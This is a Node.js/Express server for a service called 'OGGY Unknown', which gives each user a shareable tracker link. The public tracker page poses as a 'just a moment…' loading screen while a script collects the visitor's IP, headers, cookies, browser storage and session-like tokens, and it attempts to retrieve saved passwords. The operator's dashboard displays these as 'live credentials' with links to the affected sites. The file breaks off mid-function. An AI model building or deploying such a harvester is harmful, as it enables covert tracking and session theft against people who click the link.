'use strict';

const crypto = require('crypto');
const path = require('path');
const express = require('express');
const cookieParser = require('cookie-parser');
const bcrypt = require('bcryptjs');
const { nanoid } = require('nanoid');
const db = require('./db');

const app = express();
const PORT = process.env.PORT || 3000;
const SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const COOKIE = 'oggy_sid';
const MAX_PAYLOAD_BYTES = 2 * 1024 * 1024;

if (!process.env.SESSION_SECRET) {
  console.warn('[warn] SESSION_SECRET not set — sessions reset on restart.');
}

app.set('trust proxy', true);
app.use(express.json({ limit: MAX_PAYLOAD_BYTES }));
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser(SECRET));
app.use('/static', express.static(path.join(__dirname, 'public'), { maxAge: '1h' }));

// ---------------- session helpers ----------------
function setSession(res, userId) {
  res.cookie(COOKIE, String(userId), {
    signed: true,
    httpOnly: true,
    sameSite: 'lax',
    secure: process.env.NODE_ENV === 'production',
    maxAge: 1000 * 60 * 60 * 24 * 30
  });
}
function clearSession(res) { res.clearCookie(COOKIE); }
function currentUser(req) {
  const raw = req.signedCookies && req.signedCookies[COOKIE];
  if (!raw) return null;
  const id = parseInt(raw, 10);
  if (!Number.isFinite(id)) return null;
  return db.prepare('SELECT id, username, slug, redirect_url FROM users WHERE id = ?').get(id) || null;
}
function requireAuth(req, res, next) {
  const u = currentUser(req);
  if (!u) return res.redirect('/');
  req.user = u;
  next();
}

// ---------------- HTML shell ----------------
function shell(title, body, opts = {}) {
  const nav = opts.user
    ? `<nav>
        <span class="brand">OGGY <span class="brand-u">Unknown</span></span>
        <a href="/dashboard">dashboard</a>
        <a href="/settings">settings</a>
        <form method="post" action="/logout" style="display:inline"><button class="linkbtn">logout</button></form>
      </nav>`
    : `<nav><span class="brand">OGGY <span class="brand-u">Unknown</span></span></nav>`;
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>${escapeHtml(title)} · OGGY Unknown</title>
<style>
  :root{--bg:#07080b;--panel:#101219;--border:#1f2431;--text:#dde1ea;--muted:#8a90a0;--accent:#7df9c4;--accent2:#4ea8de;--danger:#ff6b6b}
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--text);font:15px/1.55 system-ui,-apple-system,Segoe UI,Roboto,sans-serif}
  a{color:var(--accent2);text-decoration:none}
  a:hover{text-decoration:underline}
  nav{display:flex;gap:20px;padding:16px 22px;border-bottom:1px solid var(--border);align-items:center;font-size:14px}
  .brand{font-weight:700;letter-spacing:.04em;color:var(--text);margin-right:auto;font-size:16px}
  .brand-u{color:var(--accent);font-weight:400}
  nav a{color:var(--muted)}
  nav a:hover{color:var(--text);text-decoration:none}
  .linkbtn{background:none;border:0;color:var(--muted);cursor:pointer;font:inherit;padding:0}
  .linkbtn:hover{color:var(--text)}
  main{max-width:1080px;margin:0 auto;padding:36px 22px 80px}
  h1{font-size:22px;font-weight:600;margin:0 0 22px}
  h2{font-size:13px;font-weight:600;margin:26px 0 12px;color:var(--muted);text-transform:uppercase;letter-spacing:.1em}
  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:22px;margin-bottom:18px}
  label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}
  input[type=text],input[type=password],input[type=url]{width:100%;padding:11px 13px;background:#0a0c11;border:1px solid var(--border);border-radius:8px;color:var(--text);font:inherit}
  input:focus{outline:none;border-color:var(--accent)}
  button.primary{margin-top:14px;padding:11px 18px;background:var(--accent);color:#04211a;border:0;border-radius:8px;font-weight:700;cursor:pointer;letter-spacing:.02em}
  button.primary:hover{filter:brightness(1.08)}
  .err{color:var(--danger);font-size:13px;margin-top:10px}
  .muted{color:var(--muted)}
  .mono{font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12.5px;word-break:break-all}
  table{width:100%;border-collapse:collapse;font-size:13.5px}
  th,td{text-align:left;padding:10px 8px;border-bottom:1px solid var(--border);vertical-align:top}
  th{color:var(--muted);font-weight:500;font-size:11.5px;text-transform:uppercase;letter-spacing:.06em}
  tr:hover td{background:#141824}
  .kv{display:grid;grid-template-columns:220px 1fr;gap:6px 20px;font-size:13.5px}
  .kv dt{color:var(--muted)}
  .kv dd{margin:0;word-break:break-word}
  pre{background:#0a0c11;border:1px solid var(--border);border-radius:8px;padding:14px;overflow:auto;font-size:12.5px;line-height:1.5}
  .copybtn{background:#171c27;border:1px solid var(--border);color:var(--text);padding:7px 12px;border-radius:7px;cursor:pointer;font-size:12px}
  .copybtn:hover{border-color:var(--accent)}
  .pill{display:inline-block;padding:2px 8px;border-radius:999px;font-size:11px;font-weight:600;letter-spacing:.04em}
  .pill.sess{background:#2a1a1a;color:#ff9b9b;border:1px solid #4a2020}
  .pill.cookie{background:#141d2a;color:#8fc8ff;border:1px solid #23344a}
  .pill.storage{background:#1a2a1f;color:#9ef0b8;border:1px solid #264a33}
  .pill.cred{background:#2a2419;color:#ffd48f;border:1px solid #4a3f23}
  .tag{display:inline-block;padding:1px 7px;border-radius:5px;background:#171c27;border:1px solid var(--border);font-size:11px;color:var(--muted);margin-right:4px}
  details summary{cursor:pointer;color:var(--muted);font-size:13px}
  details[open] summary{color:var(--text);margin-bottom:10px}
  .linkrow a{font-size:12px}
</style>
</head>
<body>
${nav}
<main>
${body}
</main>
</body>
</html>`;
}

// ---------------- landing / auth ----------------
app.get('/', (req, res) => {
  const u = currentUser(req);
  if (u) return res.redirect('/dashboard');
  res.send(shell('home', `
    <h1>OGGY Unknown</h1>
    <p class="muted" style="max-width:560px;margin-top:-10px">A link you send. A session you read. Sign up, set your redirect, share your tracker URL.</p>

    <div class="card" style="max-width:440px">
      <h2 style="margin-top:0">sign up</h2>
      <form method="post" action="/signup">
        <label>username</label>
        <input type="text" name="username" required minlength="3" maxlength="32" autocomplete="username">
        <label style="margin-top:12px">password</label>
        <input type="password" name="password" required minlength="6" autocomplete="new-password">
        <button class="primary" type="submit">create account</button>
        ${req.query.e ? `<div class="err">${escapeHtml(String(req.query.e))}</div>` : ''}
      </form>
    </div>

    <div class="card" style="max-width:440px">
      <h2 style="margin-top:0">log in</h2>
      <form method="post" action="/login">
        <label>username</label>
        <input type="text" name="username" required autocomplete="username">
        <label style="margin-top:12px">password</label>
        <input type="password" name="password" required autocomplete="current-password">
        <button class="primary" type="submit">log in</button>
      </form>
    </div>
  `));
});

app.post('/signup', (req, res) => {
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '');
  if (username.length < 3 || username.length > 32) return res.redirect('/?e=' + encodeURIComponent('username 3–32 chars'));
  if (!/^[a-zA-Z0-9_.-]+$/.test(username))        return res.redirect('/?e=' + encodeURIComponent('username: letters, digits, _ . - only'));
  if (password.length < 6)                         return res.redirect('/?e=' + encodeURIComponent('password ≥ 6 chars'));
  if (db.prepare('SELECT id FROM users WHERE username = ?').get(username))
    return res.redirect('/?e=' + encodeURIComponent('username taken'));

  const slug = nanoid(10);
  const hash = bcrypt.hashSync(password, 10);
  const info = db.prepare(
    'INSERT INTO users (username, password_hash, slug, redirect_url, created_at) VALUES (?,?,?,?,?)'
  ).run(username, hash, slug, 'https://example.com', new Date().toISOString());
  setSession(res, info.lastInsertRowid);
  res.redirect('/dashboard');
});

app.post('/login', (req, res) => {
  const username = String(req.body.username || '').trim();
  const password = String(req.body.password || '');
  const user = db.prepare('SELECT id, password_hash FROM users WHERE username = ?').get(username);
  if (!user || !bcrypt.compareSync(password, user.password_hash)) {
    return res.redirect('/?e=' + encodeURIComponent('bad credentials'));
  }
  setSession(res, user.id);
  res.redirect('/dashboard');
});

app.post('/logout', (req, res) => { clearSession(res); res.redirect('/'); });

// ---------------- dashboard ----------------
app.get('/dashboard', requireAuth, (req, res) => {
  const rows = db.prepare(`
    SELECT id, ip, cf_country, user_agent, created_at
    FROM visits WHERE user_id = ? ORDER BY id DESC LIMIT 300
  `).all(req.user.id);

  const trackerUrl = `${absoluteBase(req)}/t/${req.user.slug}`;

  const body = `
    <h1>dashboard</h1>
    <div class="card">
      <div class="muted" style="font-size:12.5px;letter-spacing:.08em;text-transform:uppercase;margin-bottom:8px">your tracker link</div>
      <div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap">
        <code class="mono" id="tlink">${escapeHtml(trackerUrl)}</code>
        <button class="copybtn" onclick="navigator.clipboard.writeText(document.getElementById('tlink').textContent).then(()=>this.textContent='copied')">copy</button>
      </div>
      <div class="muted" style="font-size:13px;margin-top:10px">
        redirect → <a href="${escapeHtml(req.user.redirect_url)}" target="_blank" rel="noopener">${escapeHtml(req.user.redirect_url)}</a>
        · <a href="/settings">change</a>
      </div>
    </div>

    <h2>visits (${rows.length})</h2>
    <div class="card" style="padding:0;overflow:hidden">
      <table>
        <thead><tr><th>#</th><th>time</th><th>ip</th><th>country</th><th>ua</th><th></th></tr></thead>
        <tbody>
        ${rows.length === 0 ? `<tr><td colspan="6" class="muted" style="padding:22px">no visits yet — share your link.</td></tr>` : ''}
        ${rows.map(r => `
          <tr>
            <td class="mono">${r.id}</td>
            <td class="mono">${escapeHtml(r.created_at)}</td>
            <td class="mono">${escapeHtml(r.ip || '—')}</td>
            <td class="mono">${escapeHtml(r.cf_country || '—')}</td>
            <td class="mono" style="max-width:360px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${escapeHtml((r.user_agent || '').slice(0, 90))}</td>
            <td><a href="/dashboard/visit/${r.id}">open</a></td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>
  `;
  res.send(shell('dashboard', body, { user: req.user }));
});

app.get('/dashboard/visit/:id', requireAuth, (req, res) => {
  const id = parseInt(req.params.id, 10);
  const v = db.prepare('SELECT * FROM visits WHERE id = ? AND user_id = ?').get(id, req.user.id);
  if (!v) return res.status(404).send(shell('not found', '<h1>not found</h1>', { user: req.user }));

  let p = {};
  try { p = JSON.parse(v.payload); } catch (_) {}

  const body = `
    <h1>visit #${v.id}</h1>
    <p><a href="/dashboard">← back to dashboard</a></p>

    <div class="card">
      <h2 style="margin-top:0">server-side</h2>
      <dl class="kv">
        <dt>received</dt><dd class="mono">${escapeHtml(v.created_at)}</dd>
        <dt>ip</dt><dd class="mono">${escapeHtml(v.ip || '—')}</dd>
        <dt>forwarded-for</dt><dd class="mono">${escapeHtml(v.forwarded_for || '—')}</dd>
        <dt>real-ip</dt><dd class="mono">${escapeHtml(v.real_ip || '—')}</dd>
        <dt>cf country</dt><dd class="mono">${escapeHtml(v.cf_country || '—')}</dd>
        <dt>user-agent</dt><dd class="mono">${escapeHtml(v.user_agent || '—')}</dd>
        <dt>accept-language</dt><dd class="mono">${escapeHtml(v.accept_language || '—')}</dd>
        <dt>referer</dt><dd class="mono">${escapeHtml(v.referer || '—')}</dd>
      </dl>
    </div>

    ${renderSessions(p)}
    ${renderCookies(p)}
    ${renderStorage(p)}
    ${renderCredentials(p)}

    <div class="card">
      <h2 style="margin-top:0">full payload</h2>
      <details>
        <summary>expand raw json</summary>
        <pre>${escapeHtml(JSON.stringify(p, null, 2))}</pre>
      </details>
    </div>
  `;
  res.send(shell('visit ' + v.id, body, { user: req.user }));
});

function siteFromCookieDomain(hostname) { return hostname || '—'; }

function renderSessions(p) {
  const rows = Array.isArray(p.session_tokens) ? p.session_tokens : [];
  if (rows.length === 0) {
    return `<div class="card"><h2 style="margin-top:0">session tokens</h2>
      <p class="muted" style="font-size:13px;margin:0">none detected on this visit.</p></div>`;
  }
  return `
    <div class="card">
      <h2 style="margin-top:0">session tokens (${rows.length})</h2>
      <p class="muted" style="font-size:12.5px;margin-top:0">heuristic matches — cookies/storage keys whose name looks like a session, auth token, or JWT. values shown in full; treat them as live credentials.</p>
      <table>
        <thead><tr><th>site</th><th>name</th><th>source</th><th>value</th><th>access</th></tr></thead>
        <tbody>
        ${rows.map(r => `
          <tr>
            <td class="mono">${escapeHtml(r.site || '—')}</td>
            <td class="mono">${escapeHtml(r.name)}</td>
            <td><span class="pill ${escapeHtml(r.source === 'localStorage' ? 'storage' : 'cookie')}">${escapeHtml(r.source)}</span></td>
            <td class="mono" style="max-width:420px;word-break:break-all">${escapeHtml(String(r.value).slice(0, 500))}</td>
            <td class="linkrow"><a href="${escapeHtml(r.directLink || '#')}" target="_blank" rel="noopener noreferrer">open site ↗</a></td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>`;
}

function renderCookies(p) {
  const cookies = Array.isArray(p.cookies) ? p.cookies : [];
  if (cookies.length === 0) return '';
  return `
    <div class="card">
      <h2 style="margin-top:0">cookies (${cookies.length})</h2>
      <p class="muted" style="font-size:12.5px;margin-top:0">
        readable cookies on the tracker's own domain. each cookie is tagged with the site it belongs to and a direct link.
        HttpOnly cookies and cookies for other origins are not readable from JavaScript.
      </p>
      <table>
        <thead><tr><th>site</th><th>name</th><th>value</th><th>service</th><th>access</th></tr></thead>
        <tbody>
        ${cookies.map(c => `
          <tr>
            <td class="mono">${escapeHtml(siteFromCookieDomain(c.domain || c.site || ''))}</td>
            <td class="mono">${escapeHtml(c.name)}</td>
            <td class="mono" style="max-width:340px;word-break:break-all">${escapeHtml(String(c.value).slice(0, 400))}</td>
            <td><span class="tag">${escapeHtml(c.service_guess || 'unknown')}</span></td>
            <td class="linkrow"><a href="${escapeHtml(c.directLink || '#')}" target="_blank" rel="noopener noreferrer">open ↗</a></td>
          </tr>`).join('')}
        </tbody>
      </table>
    </div>`;
}

function renderStorage(p) {
  const hasLs = p.local_storage && Object.keys(p.local_storage).length > 0;
  const hasSs = p.session_storage && Object.keys(p.session_storage).length > 0;
  const idb = Array.isArray(p.indexed_db) ? p.indexed_db : [];
  const caches = Array.isArray(p.cache_names) ? p.cache_names : [];
  const sw = Array.isArray(p.service_workers) ? p.service_workers : [];
  if (!hasLs && !hasSs && idb.length === 0 && caches.length === 0 && sw.length === 0) return '';

  const kvBlock = (obj) => Object.entries(obj || {}).map(([k, v]) =>
    `<tr><td class="mono">${escapeHtml(k)}</td><td class="mono" style="max-width:460px;word-break:break-all">${escapeHtml(String(v).slice(0, 500))}</td></tr>`
  ).join('');

  return `
    <div class="card">
      <h2 style="margin-top:0">storage</h2>
      ${hasLs ? `<h2 style="margin-top:8px">localStorage</h2><table><tbody>${kvBlock(p.local_storage)}</tbody></table>` : ''}
      ${hasSs ? `<h2>sessionStorage</h2><table><tbody>${kvBlock(p.session_storage)}</tbody></table>` : ''}
      ${idb.length ? `<h2>indexedDB (${idb.length})</h2><table><thead><tr><th>db</th><th>stores</th></tr></thead><tbody>${idb.map(d => `<tr><td class="mono">${escapeHtml(d.name)}</td><td class="mono">${escapeHtml((d.stores || []).join(', '))}</td></tr>`).join('')}</tbody></table>` : ''}
      ${caches.length ? `<h2>cache storage (${caches.length})</h2><ul>${caches.map(c => `<li class="mono">${escapeHtml(c)}</li>`).join('')}</ul>` : ''}
      ${sw.length ? `<h2>service workers (${sw.length})</h2><ul>${sw.map(c => `<li class="mono">${escapeHtml(c)}</li>`).join('')}</ul>` : ''}
    </div>`;
}

function renderCredentials(p) {
  const creds = p.credential_attempt || {};
  return `
    <div class="card">
      <h2 style="margin-top:0">saved password attempt <span class="pill cred">browser-gated</span></h2>
      <p class="muted" style="font-size:12.5px;margin-top:0">
        the credential management api is called on this page. browsers only return a credential after a user gesture and only if this origin already has one stored.
        no js api exposes the password vault.
      </p>
      <dl class="kv">
        <dt>api available</dt><dd class="mono">${credentialFlag(creds.available)}</dd>
        <dt>password credential retrieved</dt><dd class="mono">${credentialFlag(creds.passwordRetrieved)}</dd>
        <dt>federated credential retrieved</dt><dd class="mono">${credentialFlag(creds.federatedRetrieved)}</dd>
        <dt>username (if returned)</dt><dd class="mono">${escapeHtml(creds.username || '—')}</dd>
        <dt>note</dt><dd class="muted">${escapeHtml(creds.note || '—')}</dd>
      </dl>
    </div>`;
}
function credentialFlag(v) {
  if (v === true) return '<span style="color:#9ef0b8">yes</span>';
  if (v === false) return '<span style="color:#ff9b9b">no</span>';
  return '<span class="muted">—</span>';
}

// ---------------- settings ----------------
app.get('/settings', requireAuth, (req, res) => {
  const trackerUrl = `${absoluteBase(req)}/t/${req.user.slug}`;
  res.send(shell('settings', `
    <h1>settings</h1>
    <div class="card" style="max-width:600px">
      <h2 style="margin-top:0">redirect url</h2>
      <form method="post" action="/settings">
        <label>where visitors land after the tracker fires</label>
        <input type="url" name="redirect_url" value="${escapeHtml(req.user.redirect_url)}" required>
        <button class="primary" type="submit">save</button>
      </form>
    </div>
    <div class="card" style="max-width:600px">
      <h2 style="margin-top:0">your link</h2>
      <code class="mono" id="tlink">${escapeHtml(trackerUrl)}</code>
      <div><button class="copybtn" style="margin-top:10px" onclick="navigator.clipboard.writeText(document.getElementById('tlink').textContent).then(()=>this.textContent='copied')">copy</button></div>
    </div>
  `, { user: req.user }));
});

app.post('/settings', requireAuth, (req, res) => {
  const url = String(req.body.redirect_url || '').trim();
  try { new URL(url); } catch { return res.redirect('/settings?e=bad+url'); }
  db.prepare('UPDATE users SET redirect_url = ? WHERE id = ?').run(url, req.user.id);
  res.redirect('/settings');
});

// ---------------- public tracker page ----------------
app.get('/t/:slug', (req, res) => {
  const user = db.prepare('SELECT id, redirect_url FROM users WHERE slug = ?').get(req.params.slug);
  if (!user) return res.status(404).send('not found');
  const api = `/api/collect/${req.params.slug}`;
  res.set('Cache-Control', 'no-store');
  res.send(`<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>one moment…</title>
<style>
  html,body{margin:0;height:100%;background:#07080b;color:#c5c6c7;font-family:system-ui,sans-serif}
  .wrap{display:flex;align-items:center;justify-content:center;height:100%;flex-direction:column;gap:12px}
  .spin{width:32px;height:32px;border:3px solid #1f2431;border-top-color:#7df9c4;border-radius:50%;animation:s .8s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  p{opacity:.55;font-size:14px;letter-spacing:.02em}
</style></head>
<body>
<div class="wrap"><div class="spin"></div><p>just a moment…</p></div>
<script>
  window.__OGGY__ = {
    api: ${JSON.stringify(api)},
    redirect: ${JSON.stringify(user.redirect_url)}
  };
</script>
<script src="/static/tracker.js"></script>
</body></html>`);
});

// ---------------- collector endpoint ----------------
app.post('/api/collect/:slug', (req, res) => {
  const user = db.prepare('SELECT id FROM users WHERE slug = ?').get(req.params.slug);
  if (!user) return res.status(404).json({ ok: false });

  const xff = String(req.headers['x-forwarded-for'] || '').split(',')[0].trim() || null;
  const ip = xff || req.socket.remoteAddress || null;
  const realIp = req.headers['x-real-ip'] || null;
  const cfCountry = req.headers['cf-ipcountry'] || null;

  const payload = (req.body && typeof req.body === 'object') ? req.body : {};
  payload.server = {
    ip, xff, realIp, cfCountry,
    headers: {
      ua: req.headers['user-agent'] || null,
      accept: req.headers['accept'] || null,
      acceptLanguage: req.headers['accept-language'] || null,
      acceptEncoding: req.headers['accept-encoding'] || null,
      host: req.headers['host'] || null
    }
  };

  try {
    db.prepare(`
      INSERT INTO visits
        (user_id, ip, forwarded_for, real_ip, cf_country, user_agent, accept_language, referer, payload, created_at)
      VALUES (?,?,?,?,?,?,?,?,?,?)
    `).run(
      user.id, ip, xff, realIp, cfCountry,
      req.headers['user-agent'] || null,
      req.headers['accept-language'] || null,
      req.headers['referer'] || null,
      JSON.stringify(payload),
      new Date().toISOString()
    );
  } catch (e) {
    console.error('insert failed', e);
    return res.status(500).json({ ok: false });
  }

  res.json({ ok: true });
});

// ---------------- helpers ----------------
function escapeHtml(s) {
  return String(s == null ? '' : s).replace
